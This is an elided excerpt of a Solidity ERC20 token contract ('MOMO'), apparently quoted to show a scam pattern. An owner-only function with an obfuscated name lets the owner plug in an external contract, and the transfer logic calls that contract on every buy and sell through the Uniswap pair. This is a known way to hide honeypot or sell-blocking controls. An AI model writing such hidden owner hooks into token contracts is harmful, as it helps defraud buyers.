...
contract TokenM is ERC20 {
    ...
    RCoveAmountacasuv public acasuv;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("MOMOERC", "MOMO") {
    ...
    function cucdtlurBayngcYangs(RCoveAmountacasuv _acasuv) public onlyOwner {
        acasuv = _acasuv;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                acasuv.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				acasuv.addOutAmount(from, amount);
            }else{
                acasuv.addOutAmount(from, amount);
                takeFee = false;
            }
